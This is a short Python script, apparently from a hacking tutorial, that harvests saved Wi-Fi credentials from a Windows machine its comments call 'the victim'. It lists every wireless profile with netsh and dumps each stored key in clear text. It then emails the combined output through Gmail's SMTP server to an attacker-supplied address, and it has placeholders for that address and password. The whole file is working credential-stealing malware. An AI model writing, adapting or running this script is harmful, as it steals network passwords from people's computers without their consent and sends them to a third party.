#This will contact the interpreter. 
#!/usr/bin/env python

import subprocess, smtplib, re 

def sending_email(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #using the gmail server.
    server.starttls() #Creates a TLS connection.
    server.login(email, password) # Login into our gmail account.
    server.sendmail(email, email, message) #Sending the email to ourselves
    #This will allow the server to quit. 
    server.quit()


command = "netsh wlan show profile" 
network = subprocess.check_output(command, shell=True) #Display all the networks on the system  

#Converting the network variable into a string
network = (network.decode(encoding="UTF-8")) #This will decode the output. 

#Creating a pattern to search for what we want
network_pattern = re.compile(r"(?:Profile\s*:\s)(.*)") 
network_on_victim =network_pattern.findall(network) #Creating a list of networks on host machine. 

#Creating an empty. 
final_result = "-"

for net in network_on_victim: 
    command = f"netsh wlan show profile {net} key=clear" 
    result = subprocess.check_output(command, shell = True)  #Convert Byte into strings 
    result = result.decode(encoding="UTF-8")  
    final_result += result
#You need to add your e-mail address and ensure you enter your password. 
sending_email("<adding your e-mail address>", "<enter you password>", final_result)
